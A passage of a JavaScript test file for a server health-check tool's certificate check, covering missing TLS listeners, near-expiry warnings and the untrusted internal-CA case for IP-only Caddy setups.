    const calls = readFileSync(join(home, 'openssl-calls'), 'utf8');
    expect(calls.indexOf('-connect 127.0.0.1:443')).toBeGreaterThan(-1);
    expect(calls.indexOf('-connect 127.0.0.1:443'))
      .toBeLessThan(calls.indexOf('-connect 203.0.113.7:443'));
  });

  it('still FAILs when NO listener answers on any of the box\'s addresses', () => {
    const home = healthy('ccrc-doctor-cert-nowhere-');
    writeFileSync(join(home, 'fixture-tls-refused'), '');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL cert: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: .*caddy/);
  });

  it('WARNs when the cert expires within 14 days — renewal is failing, not yet failed', () => {
    const home = healthy('ccrc-doctor-cert-close-');
    writeFileSync(join(home, 'fixture-cert-enddate'), `${endDateFixture(5)}\n`);
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN cert: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/\d+ days/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: \S/);
    expect(r.code).toBe(0);                       // a warning does not fail the run
  });

  it('FAILs pointing at the caddy check when nothing answers the handshake', () => {
    const home = healthy('ccrc-doctor-cert-refused-');
    writeFileSync(join(home, 'fixture-tls-refused'), '');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL cert: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    // "nothing serves TLS here" is the CADDY check's territory, and this line
    // must send the reader there rather than duplicating its diagnosis.
    expect(`${lines[i]}\n${lines[i + 1]}`).toContain('caddy check');
    expect(r.code).toBe(1);
  });

  // ── mode ip (stage 5, S10): the chain is caddy's internal CA, by design ──
  // The internal leaf renews every 12 hours, so the 14-day floor would cry
  // renewal-failure forever on a box working exactly as built. The verdict is
  // the honest one: served, and not publicly trusted until each device has
  // done the trust ceremony once — WARN, never PASS-green and never FAIL.
  it('WARNs on mode ip that the chain is not publicly trusted, naming the trust ceremony', () => {
    const home = healthy('ccrc-doctor-cert-ip-');
    writeExposureEnv(home, { ip: '203.0.113.7' });
    // An internal-CA leaf: expiry hours out — under the public floor, and
    // exactly what a HEALTHY ip box serves. The mutation this pins: route ip
    // mode through the 14-day arm and this test reds on the renewal costume.
    writeFileSync(join(home, 'fixture-cert-enddate'), `${endDateFixture(1)}\n`);
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN cert: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toContain('not publicly trusted');
    expect(lines[i]).not.toMatch(/renewal is failing/);
    // The remedy IS the trust ceremony: this box's own command, and the root
    // file a phone installs.
    expect(lines[i + 1]).toContain('caddy trust');
    expect(lines[i + 1]).toContain('/var/lib/caddy/.local/share/caddy/pki/authorities/local/root.crt');
    expect(r.code, 'a by-design WARN must not fail the run').toBe(0);
  });

  it('probes mode ip WITHOUT SNI — a servername is a HOSTNAME, and this box has none', () => {
    const home = healthy('ccrc-doctor-cert-ip-sni-');
    writeExposureEnv(home, { ip: '203.0.113.7' });
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'cert'), r.stdout).toMatch(/^WARN cert: /);
    const calls = readFileSync(join(home, 'openssl-calls'), 'utf8');
    expect(calls).toContain('-connect 127.0.0.1:443');
    expect(calls).not.toContain('-servername');
  });

  it('mode ip still FAILs when nothing answers — the trust WARN sits AFTER presence, not instead of it', () => {
    const home = healthy('ccrc-doctor-cert-ip-refused-');
    writeExposureEnv(home, { ip: '203.0.113.7' });
    writeFileSync(join(home, 'fixture-tls-refused'), '');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL cert: /m);
    expect(r.code).toBe(1);
  });
});